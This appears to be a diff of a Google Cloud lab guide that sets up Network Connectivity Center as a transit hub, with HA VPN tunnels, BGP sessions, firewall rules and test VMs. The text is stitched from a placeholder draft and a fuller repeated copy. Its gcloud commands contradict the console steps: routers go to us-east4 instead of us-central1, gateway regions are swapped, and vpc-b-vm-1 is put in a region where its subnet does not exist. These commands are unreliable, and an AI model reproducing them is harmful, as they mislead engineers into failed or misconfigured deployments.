+| Cloud Router          | *cr-vpc-b-usw2-1*      |
+| VPN tunnel one        | *vpc-b-to-transit-tu1* |
+| Pre-shared key        | *gcprocks*             |
+| VPN tunnel second     | *vpc-b-to-transit-tu2* |
+| Pre-shared key        | *gcprocks*             |
+
+###### Add BGP sessions for each VPN tunnel configured from vpc-b to vpc-transit
+
+BGP session for tunnel *vpc-b-to-transit-tu1* :
+
+| BGP session                   | *vpc-b-to-transit-bgp1* |
+| ----------------------------- | ----------------------- |
+| Peer ASN                      | *65000*                 |
+| Cloud Router BGP IPv4 address | 169.254.1.10            |
+| BGP peer IPv4 address         | 169.254.1.9             |
+
+BGP session for tunnel *vpc-b-to-transit-tu2* :
+
+| BGP session                   | *vpc-b-to-transit-bgp2* |
+| ----------------------------- | ----------------------- |
+| Peer ASN                      | *65000*                 |
+| Cloud Router BGP IPv4 address | 169.254.1.14            |
+| BGP peer IPv4 address         | 169.254.1.13            |
+
+##### **Step 5: Verify the all the VPN connections status from the VPN page**
+
+- Scroll down the page to confirm that all connections are good.
+
+![VPN page with all VPN tunnel statuses displaying Established and Bgp session statuses displaying BGP established](https://cdn.qwiklabs.com/QBF07Zii%2ByXoSqxQJHLbXtBlApXTpiIeZTYsGZVP1rU%3D)
+
+Click *Check my progress* to verify the objective.
+
+Create a pair of VPN tunnels between vpc-transit to vpc-a and vpc-b
+
+
+
+Check my progress
+
+
+
+### Task 4. Create NCC hub resources and attach the HA VPNs as spokes
+
+In this section you will create a VPC and create 2 subnets inside that VPC. This will all be done using gcloud CLI commands inside Google Cloud Shell.
+
+Before you can perform any tasks for Network Connectivity Center, you must enable the Network Connectivity API.
+
+1. From the **Navigation Menu**, search for **API & Services**.
+2. Click on **Library**, and search for **Network Connectivity API**.
+3. Select the **Network Connectivity API**.
+
+![Network Connectivity API option highlighted in the search results](images/hyB14LnLTAnovI6IC9wDMAoNbXT77qxEZyNIzXnww9Q%3D.png)
+
+1. Click **Enable**.
+2. In this lab `gcloud` commands are used to configure the Network Connectivity Center. In order to authorize Cloud Shell to run the gcloud commands, open the Google Cloud Shell by clicking **Activate Cloud Shell**(![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)).
+3. Run the following command to list the active account name:
+
+```
+gcloud auth list
+```
+
+
+
+1. Click **Authorize**.
+
+#### Step 1: Create NCC hub
+
+- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents:
+
+```
+gcloud alpha network-connectivity hubs create transit-hub \
+   --description=Transit_hub
+```
+
+
+
+#### Step 2: Create the spoke for branch office 1
+
+- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents:
+
+```
+gcloud alpha network-connectivity spokes create bo1 \
+    --hub=transit-hub \
+    --description=branch_office1 \
+    --vpn-tunnel=transit-to-vpc-a-tu1,transit-to-vpc-a-tu2 \
+    --region=Region 1
+```
+
+
+
+#### Step 3: Create the spoke for branch office 2
+
+- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents.
+
+```
+gcloud alpha network-connectivity spokes create bo2 \
+    --hub=transit-hub \
+    --description=branch_office2 \
+    --vpn-tunnel=transit-to-vpc-b-tu1,transit-to-vpc-b-tu2 \
+    --region=Region 2
+```
+
+
+
+Click *Check my progress* to verify the objective.
+
+Create NCC hub resources and attach the HA VPNs as spokes
+
+
+
+Check my progress
+
+
+
+### Task 5. Test the setup end to end deploying VMs in the remote branch office VPCs
+
+After configuring the hub and its spokes, you should be able to pass traffic from the virtual machine (VM) instance in *branch office1* to the VM instance in *branch office2*. To do this, create a *vpc-a-vm-1* in *vpc-a* and vpc-b-vm-1 in *vpc-b* respectively.
+
+First, create firewall rules: *fw-a* for *vpc-a-vm-1* in *vpc-a-sub1-use4* subnet and *fw-b* for *vpc-b-vm-1* in *vpc-b-sub1-usw2* subnet respectively to allow ingress SSH and ICMP traffic.
+
+![Network topology project screen](https://cdn.qwiklabs.com/o5dZVa%2Byv8W3ZZA%2F44UUwlMUXClCGuSQhpERepDFpGI%3D)
+
+#### Step 1: Create Firewall rule for vpc-a
+
+1. In the Cloud Platform Console, click **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) at the top left of the screen.
+2. Then navigate to **VPC network** > **Firewall**.
+3. Click on **CREATE FIREWALL RULE** and specify the details as shown.
+
+![Firewall Rule Creation](images/zau55jMGfANEcN6iYWMuSz8iCdjBuUPyY4yr9dbi2wA%3D.png) ![Firewall Rule Creation](https://cdn.qwiklabs.com/sYV7SXfm3cPA1o%2BCqRqq%2BYnJ%2FvWaFhMl03VXNFETmMk%3D)
+
+1. Similarly, create firewall rule **fw-b** for **vpc-b**.
+
+#### Step 2: Create VM in vpc-a
+
+1. In the **Cloud console**, on the **Navigation menu** (☰), click **Compute Engine** > **VM Instances**, then click **Create instance**.
+
+**Note:** This may take a minute to initialize for the first time.
+
+There are many parameters you can configure when creating a new instance. Use the following for this lab:
+
+1. In the **Machine configuration**
+
+   Enter the values for the following fields:
+
+   | Field       | Value        |
+   | :---------- | :----------- |
+   | **Name**    | `vpc-a-vm-1` |
+   | **Region**  | `<Region 1>` |
+   | **Zone**    | `<Zone 1>`   |
+   | **Series**  | `E2`         |
+   | **Machine** | `e2-medium`  |
+
+2. Click **OS and storage**
+
+   Click **Change** to begin configuring your boot disk and select the values for:
+
+   | Field                | Value                                   |
+   | :------------------- | :-------------------------------------- |
+   | **Operating system** | `Debian`                                |
+   | **Version**          | `Debian GNU/Linux 11 (bullseye) x86/64` |
+   | **Boot disk type**   | `balanced persistent disk`              |
+   | **Size (GB)**        | `10 GB`                                 |
+
+3. Click **Networking**
+
+   - Network interfaces
+
+      
+
+     : click on
+
+      
+
+```
+     default
+     ```
+
+
+​      
+
+     to edit.
+    
+     - **Network**: `vpc-a`
+     - **Subnetwork**: `vpc-a-sub1-use4`
+
+4. Once all sections are configured, scroll down and click **Create** to launch your virtual machine instance.
+
+**Note:** The instance creation process is asynchronous. You can check on the status of the task using the top right-hand side **Activities** icon. Wait for it to finish - it shouldn't take more than a minute.
+
+**Note:** If you receive an error when creating a VM, click into **Details**. Most likely you need to try again with a different zone.
+
+Once finished, you should see the new virtual machine in the **VM Instances** page.
+
+Similarly, create another VM in **vpc-b** using the following parameters:
+
+1. In the **Machine configuration**
+
+   Enter the values for the following fields:
+
+   | Field       | Value        |
+   | :---------- | :----------- |
+   | **Name**    | `vpc-b-vm-1` |
+   | **Region**  | `<Region 2>` |
+   | **Zone**    | `<Zone 2>`   |
+   | **Series**  | `E2`         |
+   | **Machine** | `e2-medium`  |
+
+2. Click **OS and storage**
+
+   Click **Change** to begin configuring your boot disk and select the values for:
+
+   | Field                | Value                                   |
+   | :------------------- | :-------------------------------------- |
+   | **Operating system** | `Debian`                                |
+   | **Version**          | `Debian GNU/Linux 11 (bullseye) x86/64` |
+   | **Boot disk type**   | `balanced persistent disk`              |
+   | **Size (GB)**        | `10 GB`                                 |
+
+3. Click **Networking**
+
+   - Network interfaces
+
+      
+
+     : click on
+
+      
+
+     ```
+     default
+     ```
+
+      
+
+     to edit.
+
+     - **Network**: `vpc-b`
+     - **Subnetwork**: `vpc-b-sub1-usw2`
+
+4. Once all sections are configured, scroll down and click **Create** to launch your virtual machine instance.
+
+Once finished, you should see the two virtual machines in the **VM Instances** page.
+
+1. Copy the internal IP of **vpc-b-vm-1**.
+
+![IP address of vpc-b-vm-1 highlighted on the VM Instances page](images/1uljy8fJ3Z9PN3q9BV9%2F9GVKxp9YygA8rVHPQIXdQuU%3D.png)
+
+Click *Check my progress* to verify the objective.
+
+Create VMs in the remote branch office VPCs
+
+
+
+Check my progress
+
+
+
+#### Step 3: Run the ping command and verify connectivity to bo2 via NCC transit
+
+To verify the end to end connectivity, run a ping test between *vpc-a-vm-1* and *vpc-b-vm-1* using the following steps:
+
+1. SSH into **vpc-a-vm-1** by clicking on **SSH** on the right hand side of vpc-a-vm-1. This launches a SSH client directly from your browser.
+
+**Note:** You can also SSH into the virtual machine. Learn more about SSH from the [Connect to an instance using ssh documentation](https://cloud.google.com/compute/docs/instances/connecting-to-instance).
+
+
+
+![Command line terminal](images/akxcwUSd1Af5FWejHAEaGAtsp7WZTFSKeWVZACNC0Zk%3D.png)
+
+1. Run a ping test from **vpc-a-vm-1** to the internal IP of **vpc-b-vm-1**.
+2. You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents.
+
+```
+ping -c 5 <INTERNAL_IP_OF_VPC-B-VM-1>
+```
+
+
+
+![Command line terminal displaying ping statistics](images/JYccSGxzzFSU163WJCBgHq8wtgGuqfSlXSKKmGtsyaw%3D.png)
+
+#### Congratulations!
+
+This completes our lab for the Network Connectivity Center as a Transit hub with HA VPNs as spokes.
+
+
+
+### Configuring Network Connectivity Center as a Transit Hub
+
+#### Overview
+
+Network Connectivity Center (NCC) enables connecting different enterprise networks together that are outside of Google Cloud by leveraging Google's network—providing enterprises instant access to planet-scale reach and high reliability. Traffic between non-Google networks is referred to as data transfer traffic, which can occur using existing standard cloud network connectivity resources such as Cloud VPN, Dedicated or Partner Interconnect.
+
+In this lab, you will go through the process of setting up NCC as a transit hub to route traffic between two non-Google networks using Google's backbone network.
+
+#### Architecture
+
+NCC consists of hub and spoke resources.
+
+**Hub**
+
+A hub is a global Google Cloud resource that supports multiple attached spokes. It provides a simple way to connect spokes together to enable data transfer across them. A hub can provide data transfer between different on-premises locations and a Virtual Private Cloud (VPC) network through its attached spokes.
+
+**Spoke**
+
+A spoke is a Google Cloud network resource connected to a hub. It is part of the hub, and can't be created without creating the hub first. A spoke routes traffic to remote network address blocks and enables the connection of multiple remote networks.
+
+Spokes can be of one of the following types:
+
+- HA VPN tunnels
+- VLAN attachments
+- Router appliance instances that you or select partners deploy within Google Cloud
+
+The following network topology is similar to a typical customer deployment having branch offices located in two geographically separate locations. For this lab, you are simulating two VPCs *vpc-a*, and *vpc-b* in `us-central1`, and `us-west2` as the branch offices respectively.
+
+The branch offices are connected to a VPC, *vpc-transit*, which is a central hub terminating a pair of HA VPNs. These VPNs are configured in a region closest to the branch offices. In the real world, these VPNs could be replaced using Interconnects.
+
+You will configure the NCC hub in the *vpc-transit* network, and the two remote branch offices will be connected using the HA VPN tunnels as spokes.
+
+![Network topology project example](images/9k3iu618o9ppsU1nO%2FJRRX17rCFJCu%2BMp33J%2FtJ1C9o%3D.png)
+
+In this lab, you will achieve the following objectives:
+
+1. Create a hub VPC called *vpc-transit*.
+2. Create two remote branch office VPCs namely *vpc-a* and *vpc-b*.
+3. Create HA VPN from *vpa-a* to *vpc-transit*, and *vpc-b* to *vpc-transit*.
+4. Create a NCC hub resource and attach the HA VPNs as spokes.
+5. Test the setup end to end deploying VMs in the remote branch office VPCs.
+
+#### Prerequisites
+
+- Basic knowledge of Google VPC Networking, and Compute Engine.
+- It is helpful to have completed the [Networking 101](https://google.qwiklabs.com/catalog_lab/311) and [VPC Networking: Cloud HA-VPN](https://www.qwiklabs.com/focuses/6270?parent=catalog) labs.
+
+#### Task 1. Create vpc-transit
+
+1. In the Google Cloud Console, in the top-right toolbar, click the **Activate Cloud Shell** button and run the following command to delete the **default** network.
+
+![Cloud Shell icon](images/vdY5e%2Fan9ZGXw5a%2FZMb1agpXhRGozsOadHURcR8thAQ%3D.png)
+
+```
+gcloud compute networks delete default
+```
+
+
+
+1. In the Google Cloud Console, from the **Navigation Menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D))**, go to **VPC network**.
+2. Click **CREATE VPC NETWORK**.
+3. Enter a Name for the network: **vpc-transit**.
+4. You do not need to create a subnet for the *vpc-transit* so click **Delete** next to New Subnet.
+5. Choose the Dynamic routing mode for the VPC network as **Global**.
+
+**Note:** Learn more about dynamic routing from the [dynamic routing mode documentation](https://cloud.google.com/vpc/docs/vpc#routing_for_hybrid_networks).
+
+1. Click **Create**.
+
+Click *Check my progress* to verify the objective.
+
+Create vpc-transit network
+
+
+
+Check my progress
+
+
+
+#### Task 2. Create remote branch office VPCs
+
+1. In the Google Cloud Console, from the **Navigation menu**, go to the **VPC network**.
+2. Click **CREATE VPC NETWORK**.
+3. Enter a Name for the network as **vpc-a**.
+4. Choose **Custom** for the Subnet creation mode.
+5. In the New subnet section, specify the following configuration parameters for a subnet:
+   - Name for the subnet: **vpc-a-sub1-use4**.
+   - Region: **`us-central1`**.
+   - IP address range **10.20.10.0/24**. This is the primary IP range for the subnet.
+6. Click **Done**.
+7. Choose the Dynamic routing mode for the VPC network as **Regional**.
+8. Click **Create**.
+9. To add the second remote branch office VPC, click **CREATE VPC NETWORK**.
+10. Enter a Name for the network as **vpc-b**.
+11. Choose **Custom** for the Subnet creation mode.
+12. In the New subnet section, specify the following configuration parameters for a subnet:
+13. Provide a Name for the subnet as **vpc-b-sub1-usw2**.
+14. Select Region as **`us-west2`**.
+15. Enter an IP address range **10.20.20.0/24**.
+16. Click **Done**.
+17. Choose the Dynamic routing mode for the VPC network as **Regional**.
+18. Click **Create**.
+
+Now you should be able to view all 3 VPCs in the VPC networks console like this:
+
+![VPC networks console displaying VPCs](images/Pb5gdQp%2B93LD4uC3K0KTB6v1mhwNz5Rst6YH1k5UTzc%3D.png)
+
+Click *Check my progress* to verify the objective.
+
+Create remote branch office VPCs namely vpc-a and vpc-b
+
+
+
+Check my progress
+
+
+
+#### Task 3. Configure HA VPN between the remote branch office VPCs and the transit hub VPC
+
+**Note:** In this lab you are simulating the remote branch offices as Google Cloud VPCs, therefore using the steps listed to [Create HA VPN between Google Cloud Networks](https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn2).
+
+
+
+For any practical implementation, you may replace the steps listed below with the steps for [Creating an HA VPN gateway to a peer VPN gateway](https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn) if you are using HA VPNs to connect to your branch offices.
+
+In this section you will configure an HA VPN between the remote branch office VPCs (*vpc-a* and *vpc-b*) and the transit hub VPC (*vpc-transit*). HA VPN uses BGP for dynamically exchanging routes between Google Cloud and the peer network. Before configuring the HA VPNs, you need to create Cloud Routers associated with each VPC network.
+
+**Note:** Learn more about Cloud Routers [in the Cloud Router overview documentation](https://cloud.google.com/network-connectivity/docs/router/concepts/overview).
+
+##### **Step 1: Create cloud routers**
+
+To create a new Cloud Router for each VPC, specify the following:
+
+1. In the Cloud Console, from the **Navigation menu**, go to **Network Connectivity** and select **Cloud Routers**.
+2. Click **Create router**.
+3. Enter name as **cr-vpc-transit-use4-1**.
+4. Select the network as **vpc-transit**.
+5. Select the region as **`us-central1`**.
+6. Enter the **ASN** as **65000**.
+7. Select **Advertise all subnets visible to the Cloud Router (Default)**.
+8. Click **Create**.
+9. Use the steps mentioned above to create additional cloud routers using the following details:
+
+| **Cloud Router name**   | **VPC Network** | **Region**    | **Google ASN** |
+| ----------------------- | --------------- | ------------- | -------------- |
+| *cr-vpc-transit-usw2-1* | vpc-transit     | `us-west2`    | 65000          |
+| *cr-vpc-a-use4-1*       | vpc-a           | `us-central1` | 65001          |
+| *cr-vpc-b-usw2-1*       | vpc-b           | `us-west2`    | 65002          |
+
+```
+gcloud compute routers create cr-vpc-transit-use4-1 \
+    --region us-east4 \
+    --network vpc-transit \
+    --asn 65000
+
+gcloud compute routers create cr-vpc-transit-usw2-1 \
+    --region us-west2 \
+    --network vpc-transit \
+    --asn 65000
+
+
+gcloud compute routers create cr-vpc-a-use4-1 \
+    --region us-east4 \
+    --network vpc-a \
+    --asn 65001
+
+
+gcloud compute routers create cr-vpc-b-usw2-1 \
+    --region us-west2 \
+    --network vpc-b \
+    --asn 65002
+```
+
+
+
+
+
+##### **Step 2: Create HA VPN gateways**
+
+Create an HA VPN gateway in the *vpc-transit* network for `us-central1` region, using the following steps:
+
+1. From the **Navigation menu**, go to **Network Connectivity** and select **VPN**.
+2. Click **Create VPN connection**.
+3. Select **High-availability (HA) VPN**.
+4. Click **Continue**.
+5. Specify a VPN gateway name as **vpc-transit-gw1-use4**.
+6. Under the VPC network, select **vpc-transit**.
+7. Select a Region as **`us-central1`**.
+8. Click **Create and continue**.
+
+**Note:** Before adding VPN tunnels, you need to create additional VPN gateways.
+
+1. From the VPN page, select **Cloud VPN Gateways**.
+2. Click **Create VPN gateway** and enter the following details to create the additional VPN gateways:
+
+| **VPN gateway name**   | **VPC Network** | **Region**    |
+| ---------------------- | --------------- | ------------- |
+| *vpc-transit-gw1-usw2* | vpc-transit     | `us-west2`    |
+| *vpc-a-gw1-use4*       | vpc-a           | `us-central1` |
+| *vpc-b-gw1-usw2*       | vpc-b           | `us-west2`    |
+
+```
+gcloud compute vpn-gateways create vpc-transit-gw1-use4 \
+   --network=vpc-transit \
+   --region=us-west1 
+
+
+gcloud compute vpn-gateways create vpc-transit-gw1-usw2 \
+   --network=vpc-transit \
+   --region=us-central1
+
+
+gcloud compute vpn-gateways create vpc-a-gw1-use4 \
+   --network=vpc-a \
+   --region=us-west1 
+
+gcloud compute vpn-gateways create vpc-b-gw1-usw2 \
+   --network=vpc-b \
+   --region=us-central1
+```
+
+
+
+Click *Check my progress* to verify the objective.
+
+Create cloud routers and HA VPN gateways
+
+
+
+Check my progress
+
+
+
+##### **Step 3: Create a pair of VPN tunnels between vpc-transit to vpc-a**
+
+###### Add VPN tunnels from vpc-transit to vpc-a
+
+Create a pair of VPN tunnels using the following steps:
+
+1. From the VPN page, click on **Cloud VPN Gateways** and select **vpc-transit-gw1-use4**.
+2. Click to **Add VPN tunnel**.
+3. For the Peer VPN Gateway, select **Google Cloud VPN Gateways**.
+4. Select the **Project Id** associated with the lab.
+5. Select the remote VPN gateway, **vpc-a-gw1-use4**.
+6. For high availability, select **Create a pair of VPN tunnels**.
+7. Select the Cloud Router **cr-vpc-transit-use4-1**.
+8. Click on the VPN tunnel to enter the tunnel details:
+   - The Cloud VPN and the associated peer VPN gateway interface information should be pre-populated
+   - Name: **transit-to-vpc-a-tu1**
+   - IKE version: IKEv2
+   - IKE pre-shared key: **gcprocks**
+9. Click **Done**.
+10. Repeat steps for the second tunnel:
+    - Name: **transit-to-vpc-a-tu2**
+    - IKE version: IKEv2
+    - IKE pre-shared key: **gcprocks**
+11. Click **Done**.
+12. Click **Create & Continue**.
+
+###### Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-a
+
+The next step is to configure BGP session for the VPN tunnel *transit-to-vpc-a-tu1*
+
+1. Click
+
+    
+
+   Configure BGP Session for transit-to-vpc-a-tu1
+
+   :
+
+   - BGP session name: **transit-to-vpc-a-bgp1**
+   - Peer ASN: **65001**
+   - Allocate BGP IPv4 address: *Manually*
+   - Cloud Router BGP IPv4 address: **169.254.1.1**
+   - BGP peer IPv4 address: **169.254.1.2**
+
+2. Click **Save and continue**.
+
+- Repeat steps to configure BGP session for the VPN tunnel *transit-to-vpc-a-tu2*.
+
+1. Click **Configure BGP Session for transit-to-vpc-a-tu2**:
+
+- BGP session name: **transit-to-vpc-a-bgp2**
+- Peer ASN: **65001**
+- Allocate BGP IPv4 address: *Manually*
+- Cloud Router BGP IPv4 address: **169.254.1.5**
+- BGP peer IPv4 address: **169.254.1.6**
+
+1. Click **Save and continue**.
+2. Click on **Save BGP configuration**.
+3. Click **OK**.
+
+###### Add VPN tunnels from vpc-a to vpc-transit
+
+Now create a pair of VPN tunnels from the *vpc-a* to *vpc-transit* to complete the bidirectional tunnel configuration using the following steps:
+
+1. From the VPN page, select **Cloud VPN Gateways** *vpc-a-gw1-use4*:
+2. Click to **Add VPN tunnel**.
+3. For the Peer VPN Gateway, select **Google Cloud VPN Gateways**.
+4. Select the **Project Id** associated with the lab.
+5. Select the remote VPN gateway, **vpc-transit-gw1-use4**
+6. For high availability, select **Create a pair of VPN tunnels**.
+7. Select the Cloud Router, **cr-vpc-a-use4-1**
+8. Click on the VPN tunnel to enter the tunnel details:
+   - The Cloud VPN and peer VPN gateway interface information should be pre-populated.
+   - Name: **vpc-a-to-transit-tu1**
+   - IKE version: IKEv2
+   - IKE pre-shared key: **gcprocks**
+9. Click **Done**.
+10. Repeat steps for the second tunnel:
+    - Name: **vpc-a-to-transit-tu2**
+    - IKE version: IKEv2
+    - IKE pre-shared key: **gcprocks**
+11. Click **Done**.
+12. Click **Create & Continue**.
+
+###### Add BGP sessions for each VPN tunnel configured from vpc-a to vpc-transit
+
+The next step is to configure BGP session for the VPN tunnel: *transit-to-vpc-a-tu1*
+
+1. Click
+
+    
+
+   Configure BGP Session for vpc-a-to-transit-tu1
+
+   - BGP session name: **vpc-a-to-transit-bgp1**
+   - Peer ASN: **65000**
+   - Allocate BGP IPv4 address: *Manually*
+   - Cloud Router BGP IPv4 address: **169.254.1.2**
+   - BGP peer IPv4 address: **169.254.1.1**
+
+2. Click **Save and continue**.
+
+Repeat steps to configure BGP session for the VPN tunnel: *transit-to-vpc-a-tu2*
+
+1. Click
+
+    
+
+   Configure BGP Session for vpc-a-to-transit-tu2
+
+   - BGP session name: **vpc-a-to-transit-bgp2**
+   - Peer ASN: **65000**
+   - Allocate BGP IPv4 address: *Manually*
+   - Cloud Router BGP IPv4 address: **169.254.1.6**
+   - BGP peer IPv4 address: **169.254.1.5**
+
+2. Click **Save and continue**.
+
+3. Click on **Save BGP configuration**.
+
+4. Click **OK**.
+
+Once this step is complete the VPN tunnel status should reflect *Established* and BGP status should reflect *BGP established*.
+
+##### **Step 4: Create a pair of VPN tunnels between vpc-transit to vpc-b**
+
+- Repeat steps listed above (step 3) to create the bidirectional HA VPN tunnels between the vpc-transit and vpc-b networks using the details below.
+
+###### Add VPN tunnels from vpc-transit to vpc-b
+
+| Peer VPN gateway name | *vpc-b-gw1-usw2*        |
+| --------------------- | ----------------------- |
+| Cloud Router          | *cr-vpc-transit-usw2-1* |
+| VPN tunnel one        | *transit-to-vpc-b-tu1*  |
+| Pre-shared key        | *gcprocks*              |
+| VPN tunnel two        | *transit-to-vpc-b-tu2*  |
+| Pre-shared key        | *gcprocks*              |
+
+###### Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-b
+
+BGP session for tunnel *transit-to-vpc-b-tu1* :
+
+| BGP session                   | *transit-to-vpc-b-bgp1* |
+| ----------------------------- | ----------------------- |
+| Peer ASN                      | *65002*                 |
+| Cloud Router BGP IPv4 address | 169.254.1.9             |
+| BGP peer IPv4 address         | 169.254.1.10            |
+
+BGP session for tunnel *transit-to-vpc-b-tu2* :
+
+| BGP session                   | *transit-to-vpc-b-bgp2* |
+| ----------------------------- | ----------------------- |
+| Peer ASN                      | *65002*                 |
+| Cloud Router BGP IPv4 address | 169.254.1.13            |
+| BGP peer IPv4 address         | 169.254.1.14            |
+
+###### Add VPN tunnels from vpc-b to vpc-transit
+
+| Peer VPN gateway name | *vpc-transit-gw1-usw2* |
+| --------------------- | ---------------------- |
+| Cloud Router          | *cr-vpc-b-usw2-1*      |
+| VPN tunnel one        | *vpc-b-to-transit-tu1* |
+| Pre-shared key        | *gcprocks*             |
+| VPN tunnel second     | *vpc-b-to-transit-tu2* |
+| Pre-shared key        | *gcprocks*             |
+
+###### Add BGP sessions for each VPN tunnel configured from vpc-b to vpc-transit
+
+BGP session for tunnel *vpc-b-to-transit-tu1* :
+
+| BGP session                   | *vpc-b-to-transit-bgp1* |
+| ----------------------------- | ----------------------- |
+| Peer ASN                      | *65000*                 |
+| Cloud Router BGP IPv4 address | 169.254.1.10            |
+| BGP peer IPv4 address         | 169.254.1.9             |
+
+BGP session for tunnel *vpc-b-to-transit-tu2* :
+
+| BGP session                   | *vpc-b-to-transit-bgp2* |
+| ----------------------------- | ----------------------- |
+| Peer ASN                      | *65000*                 |
+| Cloud Router BGP IPv4 address | 169.254.1.14            |
+| BGP peer IPv4 address         | 169.254.1.13            |
+
+##### **Step 5: Verify the all the VPN connections status from the VPN page**
+
+- Scroll down the page to confirm that all connections are good.
+
+![VPN page with all VPN tunnel statuses displaying Established and Bgp session statuses displaying BGP established](https://cdn.qwiklabs.com/QBF07Zii%2ByXoSqxQJHLbXtBlApXTpiIeZTYsGZVP1rU%3D)
+
+Click *Check my progress* to verify the objective.
+
+Create a pair of VPN tunnels between vpc-transit to vpc-a and vpc-b
+
+
+
+Check my progress
+
+
+
+#### Task 4. Create NCC hub resources and attach the HA VPNs as spokes
+
+In this section you will create a VPC and create 2 subnets inside that VPC. This will all be done using gcloud CLI commands inside Google Cloud Shell.
+
+Before you can perform any tasks for Network Connectivity Center, you must enable the Network Connectivity API.
+
+1. From the **Navigation Menu**, search for **API & Services**.
+2. Click on **Library**, and search for **Network Connectivity API**.
+3. Select the **Network Connectivity API**.
+
+![Network Connectivity API option highlighted in the search results](images/hyB14LnLTAnovI6IC9wDMAoNbXT77qxEZyNIzXnww9Q%3D.png)
+
+1. Click **Enable**.
+2. In this lab `gcloud` commands are used to configure the Network Connectivity Center. In order to authorize Cloud Shell to run the gcloud commands, open the Google Cloud Shell by clicking **Activate Cloud Shell**(![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)).
+3. Run the following command to list the active account name:
+
+```
+gcloud auth list
+```
+
+
+
+1. Click **Authorize**.
+
+##### Step 1: Create NCC hub
+
+- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents:
+
+```
+gcloud alpha network-connectivity hubs create transit-hub \
+   --description=Transit_hub
+```
+
+
+
+##### Step 2: Create the spoke for branch office 1
+
+- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents:
+
+```
+gcloud alpha network-connectivity spokes create bo1 \
+    --hub=transit-hub \
+    --description=branch_office1 \
+    --vpn-tunnel=transit-to-vpc-a-tu1,transit-to-vpc-a-tu2 \
+    --region=us-central1
+```
+
+
+
+##### Step 3: Create the spoke for branch office 2
+
+- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents.
+
+```
+gcloud alpha network-connectivity spokes create bo2 \
+    --hub=transit-hub \
+    --description=branch_office2 \
+    --vpn-tunnel=transit-to-vpc-b-tu1,transit-to-vpc-b-tu2 \
+    --region=us-west2
+```
+
+
+
+Click *Check my progress* to verify the objective.
+
+Create NCC hub resources and attach the HA VPNs as spokes
+
+
+
+Check my progress
+
+
+
+#### Task 5. Test the setup end to end deploying VMs in the remote branch office VPCs
+
+After configuring the hub and its spokes, you should be able to pass traffic from the virtual machine (VM) instance in *branch office1* to the VM instance in *branch office2*. To do this, create a *vpc-a-vm-1* in *vpc-a* and vpc-b-vm-1 in *vpc-b* respectively.
+
+First, create firewall rules: *fw-a* for *vpc-a-vm-1* in *vpc-a-sub1-use4* subnet and *fw-b* for *vpc-b-vm-1* in *vpc-b-sub1-usw2* subnet respectively to allow ingress SSH and ICMP traffic.
+
+![Network topology project screen](images/o5dZVa%2Byv8W3ZZA%2F44UUwlMUXClCGuSQhpERepDFpGI%3D.png)
+
+##### Step 1: Create Firewall rule for vpc-a
+
+1. In the Cloud Platform Console, click **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) at the top left of the screen.
+2. Then navigate to **VPC network** > **Firewall**.
+3. Click on **CREATE FIREWALL RULE** and specify the details as shown.
+
+![Firewall Rule Creation](images/zau55jMGfANEcN6iYWMuSz8iCdjBuUPyY4yr9dbi2wA%3D.png) ![Firewall Rule Creation](images/sYV7SXfm3cPA1o%2BCqRqq%2BYnJ%2FvWaFhMl03VXNFETmMk%3D.png)
+
+1. Similarly, create firewall rule **fw-b** for **vpc-b**.
+
+##### Step 2: Create VM in vpc-a
+
+1. In the **Cloud console**, on the **Navigation menu** (☰), click **Compute Engine** > **VM Instances**, then click **Create instance**.
+
+**Note:** This may take a minute to initialize for the first time.
+
+There are many parameters you can configure when creating a new instance. Use the following for this lab:
+
+1. In the **Machine configuration**
+
+   Enter the values for the following fields:
+
+   | Field       | Value           |
+   | :---------- | :-------------- |
+   | **Name**    | `vpc-a-vm-1`    |
+   | **Region**  | `us-central1`   |
+   | **Zone**    | `us-central1-c` |
+   | **Series**  | `E2`            |
+   | **Machine** | `e2-medium`     |
+
+2. Click **OS and storage**
+
+   Click **Change** to begin configuring your boot disk and select the values for:
+
+   | Field                | Value                                   |
+   | :------------------- | :-------------------------------------- |
+   | **Operating system** | `Debian`                                |
+   | **Version**          | `Debian GNU/Linux 11 (bullseye) x86/64` |
+   | **Boot disk type**   | `balanced persistent disk`              |
+   | **Size (GB)**        | `10 GB`                                 |
+
+3. Click **Networking**
+
+   - Network interfaces
+
+      
+
+     : click on
+
+      
+
+     ```
+     default
+     ```
+
+      
+
+     to edit.
+
+     - **Network**: `vpc-a`
+     - **Subnetwork**: `vpc-a-sub1-use4`
+
+4. Once all sections are configured, scroll down and click **Create** to launch your virtual machine instance.
+
+**Note:** The instance creation process is asynchronous. You can check on the status of the task using the top right-hand side **Activities** icon. Wait for it to finish - it shouldn't take more than a minute.
+
+**Note:** If you receive an error when creating a VM, click into **Details**. Most likely you need to try again with a different zone.
+
+Once finished, you should see the new virtual machine in the **VM Instances** page.
+
+Similarly, create another VM in **vpc-b** using the following parameters:
+
+1. In the **Machine configuration**
+
+   Enter the values for the following fields:
+
+   | Field       | Value           |
+   | :---------- | :-------------- |
+   | **Name**    | `vpc-b-vm-1`    |
+   | **Region**  | `us-central1`   |
+   | **Zone**    | `us-central1-c` |
+   | **Series**  | `E2`            |
+   | **Machine** | `e2-medium`     |
+
+2. Click **OS and storage**
+
+   Click **Change** to begin configuring your boot disk and select the values for:
+
+   | Field                | Value                                   |
